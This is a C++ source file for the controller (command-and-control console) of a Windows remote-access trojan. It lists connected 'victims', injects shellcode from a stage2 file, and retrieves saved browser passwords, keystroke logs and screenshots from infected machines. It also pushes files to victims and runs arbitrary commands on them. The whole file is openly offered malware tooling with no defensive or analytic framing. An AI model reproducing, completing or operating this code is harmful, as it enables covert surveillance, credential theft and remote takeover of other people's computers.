//-- The C standard Library
#include <cstdlib>

#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib") //--Pragma comment for linker.

#include <windows.h>
#include <stdio.h>
#include <winsock.h>

//-- Other headers.
#include "sEncryption.h"
#include "Controller.h"
//#include "stage2.h"
//--Standard includes.
#include <iostream>
#include <vector>
#include <string>
#include <sstream>
#include <thread>
#include <fstream>
#include <chrono>
#include <ctime>
 
#define _DEBUG_
#define Version MAKEWORD(2, 2)

#undef max

using namespace std;
unsigned char stage2[3020288];

//
//std::string read_text_file(const std::string& filename) {
//	std::ifstream infile(filename);
//	if (!infile) {
//		throw std::runtime_error("Failed to open file: " + filename);
//	}
//	infile.seekg(0, std::ios::end);
//	std::size_t file_size = infile.tellg();
//	infile.seekg(0, std::ios::beg);
//	std::string text_data;
//	text_data.reserve(file_size);
//	text_data.assign((std::istreambuf_iterator<char>(infile)), std::istreambuf_iterator<char>());
//	return text_data;
//}
//unsigned char* hex_to_bin(std::size_t& bin_size) {
//    std::string stage2_string = read_text_file("comrpessed.txt");
//    std::stringstream ss;
//    ss << std::hex << stage2_string;
//    std::string binary_data_str(ss.str());
//    bin_size = binary_data_str.size() / 2; // divide by 2 to get the number of bytes
//    unsigned char* binary_data = new unsigned char[bin_size];
//    std::memcpy(binary_data, binary_data_str.data(), bin_size);
//    return binary_data;
//}


void __cdecl send_Shellcode_ToClient(unsigned int clientId)
{

 //read stage2 bytes from textfile 

		std::ifstream file("stage2.txt", std::ios::binary);
		if (file) {
			std::vector<unsigned char> byteVector;
			std::string line;
			while (std::getline(file, line)) { //get each line in text file
				std::istringstream iss(line);
				std::string hexValue; 
				while (std::getline(iss, hexValue, ',')) {  //seperate each hexa value using comma as delimter
					//std::cout << hexValue << endl;
					//Sleep(1000);
					std::stringstream converter(hexValue); //convert hexa string to hexa intger
					unsigned int intValue;
					converter >> std::hex >> intValue;
			
					byteVector.push_back(static_cast<unsigned char>(intValue)); //save into vector
				}
			}
			if (byteVector.size() > sizeof(stage2)) {
				std::cerr << "Error: file size exceeds buffer size." << std::endl;
				return;
			}
			std::copy(byteVector.begin(), byteVector.end(), stage2);
			std::cout << "vec size "<< std::to_string(byteVector.size()) << std::endl;
		}
		else
			std::cerr << "Error: could not open file." << std::endl;

	size_t dataSize = sizeof(stage2);
	int bytesSent = send(clientId, (const char*)stage2, dataSize, NULL);
	//Sleep(5000);
	if (bytesSent == SOCKET_ERROR) {
		std::cerr << "Error sending data: " << WSAGetLastError() << std::endl;
	}
	else {
		std::cout << "Sent " << bytesSent << " bytes of data" << std::endl;
	}
	return;
};
bool __cdecl get_password(unsigned int clientId, std::string exe_path)
{	
	
	// get path to save the file in: 
	char output_dir[MAX_PATH] = "";
	std::string dirPath = "";
	//retrieves the file path of the current running executable and save into buffer
	if (!GetModuleFileNameA(NULL, output_dir, sizeof(output_dir)) == 0) {
		dirPath = output_dir; // full path to .exe
		dirPath = dirPath.substr(0, dirPath.find_last_of("\\/"));//dir path
		dirPath += "\\results\\passwords.txt";
	}

	// get the password file path on victim side
	std::string pswd_path = exe_path;
	std::size_t pos = pswd_path.rfind(".");
	if (pos != std::string::npos) {
		//delete .exe and make it .txt
		pswd_path.erase(pos + 1);//earse all after the .
		pswd_path.append("txt"); // add new extension
	}
	std::string stringBuffer = "getfile " + pswd_path + "|" + dirPath; // getfile C:\Users\amr\client1\Project1.txt|C:\Users\amr\results\passwords.txt
	const char* ch = stringBuffer.c_str();
	int bytesSent = send(clientId, ch , stringBuffer.length(), NULL);
	if (bytesSent == SOCKET_ERROR) {
		std::cerr << "Error sending data: " << WSAGetLastError() << std::endl;
		return false;
	}
	else {
		return true;
	}
};
bool __cdecl get_keylogs(unsigned int clientId, std::string exe_path)
{

	// get path to save the file in: 
	char output_dir[MAX_PATH] = "";
	std::string dirPath = "";
	//retrieves the file path of the current running executable and save into buffer
	if (!GetModuleFileNameA(NULL, output_dir, sizeof(output_dir)) == 0) {
		dirPath = output_dir; // full path to .exe
		dirPath = dirPath.substr(0, dirPath.find_last_of("\\/"));//dir path
		dirPath += "\\results\\keylogs.log";
	}

	// get the password file path on victim side
	std::string pswd_path = exe_path;
	std::size_t pos = pswd_path.rfind(".");
	if (pos != std::string::npos) {
		//delete .exe and make it .txt
		pswd_path.erase(pos + 1);//earse all after the .
		pswd_path.append("log"); // add new extension
	}
	std::string stringBuffer = "getfile " + pswd_path + "|" + dirPath; // getfile C:\Users\amr\client1\Project1.log|C:\Users\amr\results\keylogs.log
	const char* ch = stringBuffer.c_str();
	int bytesSent = send(clientId, ch, stringBuffer.length(), NULL);
	if (bytesSent == SOCKET_ERROR) {
		std::cerr << "Error sending data: " << WSAGetLastError() << std::endl;
		return false;
	}
	else {
		return true;
	}
};
bool __cdecl get_screenshot(unsigned int clientId, std::string exe_path)
{

	// get path to save the file in: 
	char output_dir[MAX_PATH] = "";
	std::string dirPath = "";
	//retrieves the file path of the current running executable and save into buffer
	if (!GetModuleFileNameA(NULL, output_dir, sizeof(output_dir)) == 0) {
		dirPath = output_dir; // full path to .exe
		dirPath = dirPath.substr(0, dirPath.find_last_of("\\/"));//dir path
		dirPath += "\\results\\screenshot.bmp";
	}

	// get the password file path on victim side
	std::string pswd_path = exe_path;
	std::size_t pos = pswd_path.rfind(".");
	if (pos != std::string::npos) {
		//delete .exe and make it .txt
		pswd_path.erase(pos + 1);//earse all after the .
		pswd_path.append("bmp"); // add new extension
	}
	std::string stringBuffer = "getfile " + pswd_path + "|" + dirPath; // getfile C:\Users\amr\client1\Project1.log|C:\Users\amr\results\keylogs.log
	const char* ch = stringBuffer.c_str();
	int bytesSent = send(clientId, ch, stringBuffer.length(), NULL);
	//Sleep(30000);
	if (bytesSent == SOCKET_ERROR) {
		std::cerr << "Error sending data: " << WSAGetLastError() << std::endl;
		return false;
	}
	else {
		return true;
	}
};
bool __cdecl send_file(unsigned int clientId, std::string stringBuffer, std::string exe_path)
{

	std::string filePath1 = stringBuffer;//.rand
	std::string filePath2 = exe_path;//.exe

	// get extension of filepath1
	std::size_t lastDotPos = filePath1.find_last_of(".");
	//std::string fileExtension = filePath1.substr(lastDotPos + 1);

	std::string dirPath = filePath1.substr(filePath1.find_last_of("\\/") + 1);//dir path
	//cout << dirPath;

	// get the  file path on victim side
	std::size_t pos = filePath2.find_last_of("\\/");
	if (pos != std::string::npos) {
		//delete .exe and make it .txt
		filePath2.erase(pos + 1);//earse all after the .
		filePath2.append(dirPath); // add new extension
	}

	// create file at victim side
	std::string command = "sendfile " + filePath2;
	sendInfoToClient(clientId, (char*)command.c_str(), command.size());

	// read bytes from file at attacker to send it
	std::ifstream inStream(filePath1.c_str(), std::ios::binary);
	inStream.seekg(0, std::ios::end);

	int fileSize = inStream.tellg();
	inStream.seekg(0, std::ios::beg);

	int endingFileSize = fileSize % MAX_BUF;

	if (endingFileSize == 0)
	{

		endingFileSize = fileSize;
	};

	while (1)
	{
		char* buf = new char[MAX_BUF];
		zeroBuffer(buf, MAX_BUF);

		inStream.read(buf, MAX_BUF);

		if (inStream.eof())
		{
			int remainingBytes = inStream.gcount();
			std::cout << "remaining bytes: " << remainingBytes << std::endl;

			// Append '\n' to the end of the buffer
/*			buf[remainingBytes] = "end";
			remainingBytes+=3;*/
			std::memcpy(buf + remainingBytes, "end", 3);
			remainingBytes += 3;
			//send buffer
			sendInfoToClient(clientId, buf, remainingBytes);

			//sendInfoToClient(clientId, buf, endingFileSize);

			delete[] buf;
			break;
		};

		sendInfoToClient(clientId, buf, MAX_BUF);
		delete[] buf;
	};

	inStream.close();
	return true;
};

int __cdecl main(void)
{
	//WSADATA wsaData;
	//int status;
	//status = WSAStartup(MAKEWORD(2, 2), &wsaData);
	//if (status != 0) {
	//	// handle error
	//}
	//struct addrinfo hints = { 0 };
	//hints.ai_family = AF_INET; // IPv4
	//hints.ai_socktype = SOCK_STREAM; // TCP
	//hints.ai_flags = AI_PASSIVE; // for server sockets

	//struct addrinfo* result = NULL;
	//status = getaddrinfo("192.168.1.101", "3333", &hints, &result);
	//if (status != 0) {
	//	// handle error
	//}
	//SOCKET serverSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	//if (serverSocket == INVALID_SOCKET) {
	//	// handle error
	//}
	//status = bind(serverSocket, result->ai_addr, (int)result->ai_addrlen);
	//if (status == SOCKET_ERROR) {
	//	// handle error
	//}
	//status = listen(serverSocket, SOMAXCONN);
	//if (status == SOCKET_ERROR) {
	//	// handle error
	//}

	Controller c;


	outputColor(0xA);
	std::cout << c._startText() << "\n\nEnter the IP and Port of the server, use format address:port" << std::endl;

	outputColor(0x7);
	char inputBuffer[1024];
std:cin.get(inputBuffer, 1024);
	if (std::cin.rdstate() == 2)
	{
		return 1;
	};
	std::string inputBuffer_str = inputBuffer;

	c.ipv4ADDR = inputBuffer_str.substr(0, inputBuffer_str.find(":"));
	std::stringstream newStream;
	newStream << inputBuffer_str.substr(inputBuffer_str.find(":") + 1);
	newStream >> c.socketPort;
	std::cout << c.ipv4ADDR << ":" << c.socketPort;
	std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
	std::cout << std::endl << std::endl;

	WSAData socketDataStructure;

	int socketStartup = WSAStartup(Version, &socketDataStructure);

	if (socketStartup != NULL)
	{
		outputColor(0xC);
		std::cout << "Unable to start up socket!" << std::endl;
		outputColor(0x7);

		return 1;
	};
	unsigned int listeningServerSocket = socket(AF_INET, SOCK_STREAM, NULL);
	if (listeningServerSocket < 0)
	{
		outputColor(0xC);
		std::cout << "Creation of socket failed!" << std::endl;
		outputColor(0x7);

		exit(EXIT_FAILURE);
	};


	std::thread mainListenerThread = std::thread(Controller::listenForClients, listeningServerSocket, &c.socketPort, &c.ipv4ADDR, &c.allConnectedClients, &c.threads);

	//-- Console Parser
	while (1)
	{

		std::cout << "- >>> ";
		try
		{
			char inByteBuffer[512];
			zeroBuffer(inByteBuffer, 512);
			std::cin.get(inByteBuffer, 512);
			std::cin.clear();
			std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');

			std::string stringBuffer = std::string(inByteBuffer, strlen(inByteBuffer));
			std::stringstream stringStreamBuffer;


			if (stringBuffer.substr(0,7) == "connect")
			{
				int clientNumber;

				std::string temporaryString = stringBuffer.substr(7);
				stringStreamBuffer << temporaryString;
				stringStreamBuffer >> clientNumber;
				c.activeClient = clientNumber;

				for (auto& cClient : c.allConnectedClients)
				{

					cClient.setIsActive(0);
				};
				c.allConnectedClients.at(clientNumber).setIsActive(1);

				outputColor(0xA);
				std::cout << "Victim: " << clientNumber << " is connected." << std::endl;
				unsigned int clientId = c.allConnectedClients[c.activeClient].id;
				std::string stringBuffer = "getwindow";
				char sendInfo[1024];
				zeroBuffer(sendInfo, 1024);
				memcpy(sendInfo, stringBuffer.c_str(), strlen(stringBuffer.c_str()));
				int infoSize = strlen(sendInfo);
				sendInfoToClient(clientId, sendInfo, infoSize + 1);
				//Sleep(1000);
				//std::cout << "malware installed successfully at : " << clientNumber << " is connected." << std::endl;
				std::cout << "\n Malware installed at : " << c.allConnectedClients[c.activeClient].installed_exe_path<<std::endl;
				outputColor(0x7);
			}
	
			else if (stringBuffer.substr(0, 16) == "inject_shellcode")
			{
				//		send_Shellcode_ToClient()
				if (c.allConnectedClients.size() == 0)
				{

					outputColor(0xC);
					std::cout << "There are no clients connected." << std::endl;
					outputColor(0x7);
					continue;
				};

				unsigned int clientId = c.allConnectedClients[c.activeClient].id;
				send_Shellcode_ToClient(clientId);
				
			}
			else if (stringBuffer.substr(0, 4) == "list")
			{
				int i = 0;
				for (auto& cClient : c.allConnectedClients)
				{

					if (cClient.isActive == 1)
					{
						std::cout << "[ Victim: " << i << " | IP: " << cClient.ipAddress << " ] --> is now connected" << std::endl << std::endl;
					}
					else
					{
						std::cout << "[ Victim: " << i << " | IP: " << cClient.ipAddress << " ] " << std::endl << std::endl;
					};
					i++;
				};
				if (i == 0)
				{
					outputColor(0xC);
					std::cout << "No victims are connected." << std::endl;
					outputColor(0x7);
				};
			}
			else if (stringBuffer.substr(0, 2) == "do")
			{
				if (c.allConnectedClients.size() == 0)
				{

					outputColor(0xC);
					std::cout << "There are no victims connected." << std::endl;
					outputColor(0x7);
					continue;
				};
				unsigned int clientId = c.allConnectedClients[c.activeClient].id;

				char sendInfo[1024];
				zeroBuffer(sendInfo, 1024);
				memcpy(sendInfo, stringBuffer.substr(3).c_str(), strlen(stringBuffer.substr(3).c_str()));

				int infoSize = strlen(sendInfo);


				sendInfoToClient(clientId, sendInfo, infoSize + 1);
			}
			else if (stringBuffer.substr(0, 8) == "sendfile")
			{
				if (c.allConnectedClients.size() == 0)
				{

					outputColor(0xC);
					std::cout << "There are no clients connected." << std::endl;
					outputColor(0x7);
					continue;
				};
				stringBuffer = stringBuffer.substr(9);
				unsigned int clientId = c.allConnectedClients[c.activeClient].id;
				std::string exe_path = c.allConnectedClients[c.activeClient].installed_exe_path;

				// function 
				if (send_file(clientId, stringBuffer, exe_path))
				{
					outputColor(0xA);
					std::cout << "[+] operation done successfully" << std::endl;
					outputColor(0x7);
				}
			}
			else if (stringBuffer.substr(0, 12) == "getpasswords")
			{
				if (c.allConnectedClients.size() == 0)
				{

					outputColor(0xC);
					std::cout << "There are no clients connected." << std::endl;
					outputColor(0x7);
					continue;
				};
				unsigned int clientId = c.allConnectedClients[c.activeClient].id;
				std::string exe_path = c.allConnectedClients[c.activeClient].installed_exe_path;
				
				if (get_password(clientId, exe_path))
				{
					outputColor(0xA);
					std::cout << "[+] operation done successfully" << std::endl;
					outputColor(0x7);
				}

			}
			else if (stringBuffer.substr(0, 13) == "updatekeylogs")
			{
				if (c.allConnectedClients.size() == 0)
				{
					outputColor(0xC);
					std::cout << "There are no clients connected." << std::endl;
					outputColor(0x7);
					continue;
				};
				unsigned int clientId = c.allConnectedClients[c.activeClient].id;
				std::string exe_path = c.allConnectedClients[c.activeClient].installed_exe_path;
				if (get_keylogs(clientId, exe_path))
				{
					outputColor(0xA);
					std::cout << "[+] operation done successfully" << std::endl;
					outputColor(0x7);
				}


			}
			else if (stringBuffer.substr(0, 13) == "screenshot")
			{
			std::string stringBuffer = "screenshot";
			char sendInfo[1024];
			zeroBuffer(sendInfo, 1024);
			memcpy(sendInfo, stringBuffer.c_str(), strlen(stringBuffer.c_str()));
			int infoSize = strlen(sendInfo);
			unsigned int clientId = c.allConnectedClients[c.activeClient].id;
			sendInfoToClient(clientId, sendInfo, infoSize + 1);
			Sleep(1000);
			std::string exe_path = c.allConnectedClients[c.activeClient].installed_exe_path;
	
			if (get_screenshot(clientId, exe_path))
			{
				outputColor(0xA);
				std::cout << "[+] operation done successfully" << std::endl;
				outputColor(0x7);
			}

			}
			else if (stringBuffer.substr(0, 8) == "execfile")
			{
			std::string stringBuffer = "screenshot";
			char sendInfo[1024];
			zeroBuffer(sendInfo, 1024);
			memcpy(sendInfo, stringBuffer.c_str(), strlen(stringBuffer.c_str()));
			int infoSize = strlen(sendInfo);
			unsigned int clientId = c.allConnectedClients[c.activeClient].id;
			sendInfoToClient(clientId, sendInfo, infoSize + 1);
			Sleep(1000);
			std::string exe_path = c.allConnectedClients[c.activeClient].installed_exe_path;

			if (get_screenshot(clientId, exe_path))
			{
				outputColor(0xA);
				std::cout << "[+] operation done successfully" << std::endl;
				outputColor(0x7);
			}

			}
			else if (stringBuffer.substr(0, 5) == "clear")
			{
				std::system("CLS");

				outputColor(0xA);
				std::cout << c._startText() << std::endl << std::endl;
				outputColor(0x7);
			}
			else if (stringBuffer.substr(0, 4) == "help")
			{

				std::cout <<
					"\n\nCommands:\n"
					"  -connect; sets an active victims via its given id, I.E. => connect0 )\n"
					"  -inject_shellcode; sends shellcode to the victim to execute during runtime.\n"
					"  -getpasswords; get all saved passwords in the browser.\n"
					"  -screenshot; get screenshot from the victim at current time\n"
					"  -updatekeylogs; get all keystrokes pressed by the victim.\n"
					"  -do; sends any [victim executed commands] to the victim to process.\n"
					"  -sendfile; sends a file to the victim. syntax = sendfile [file to send] | [location on victim]\n"
					"  -shutdown/restart; shuts down or restarts the victim pc depending on which command is used.\n"
					"  -do shellexecute;place the executable path address after the call\n"
					<< endl;
			};
		}
		catch (std::exception& e)
		{
			outputColor(0xC);
			std::cout << "Error with the command." << std::endl;
			outputColor(0x7);
		};
	};


	//	std::cin.get();

	return 0;
};


//
//
//bool __cdecl send_file(unsigned int clientId, std::string stringBuffer, std::string exe_path)
//{
//	char buf[1024];
//	zeroBuffer(buf, 1024);
//	for (int i = 0; i < stringBuffer.size(); i++)
//	{
//		if (stringBuffer[i] == '|')
//		{
//			buf[i] = '\x00';
//			continue;
//		};
//
//		buf[i] = stringBuffer[i];
//	};
//
//	std::string filePath1 = std::string(buf, strlen(buf));//.rand
//	std::string filePath2 = exe_path;//.exe
//
//	// get extension of filepath1
//	std::size_t lastDotPos = filePath1.find_last_of(".");
//	std::string fileExtension = filePath1.substr(lastDotPos + 1);
//
//	// get the  file path on victim side
//	std::size_t pos = filePath2.find_last_of(".");
//	if (pos != std::string::npos) {
//		//delete .exe and make it .txt
//		filePath2.erase(pos + 1);//earse all after the .
//		filePath2.append(fileExtension); // add new extension
//	}
//
//
//
//	//--This is terrible. Absolutely atrocious. This is a ridiculous way to remove the spaces at the beginning and end.
//	while (filePath1[filePath1.size() - 1] == '\x20')
//	{
//		filePath1[filePath1.size() - 1] = '\x00';
//		filePath1 = std::string(filePath1.c_str(), strlen(filePath1.c_str()));
//	};
//	while (filePath2[0] == '\x20')
//	{
//		filePath2 = std::string(filePath2.c_str() + 1, filePath2.size() - 1);
//	};
//
//	std::string command = "sendfile " + filePath2;
//
//
//	sendInfoToClient(clientId, (char*)command.c_str(), command.size());
//
//	std::ifstream inStream(filePath1.c_str(), std::ios::binary);
//	inStream.seekg(0, std::ios::end);
//
//	int fileSize = inStream.tellg();
//	inStream.seekg(0, std::ios::beg);
//
//	int endingFileSize = fileSize % MAX_BUF;
//
//	if (endingFileSize == 0)
//	{
//
//		endingFileSize = fileSize;
//	};
//
//	while (1)
//	{
//		char* buf = new char[MAX_BUF];
//		zeroBuffer(buf, MAX_BUF);
//
//		inStream.read(buf, MAX_BUF);
//
//		if (inStream.eof())
//		{
//
//			sendInfoToClient(clientId, buf, endingFileSize);
//
//			delete[] buf;
//			break;
//		};
//
//		sendInfoToClient(clientId, buf, MAX_BUF);
//		delete[] buf;
//	};
//
//	inStream.close();
//
//};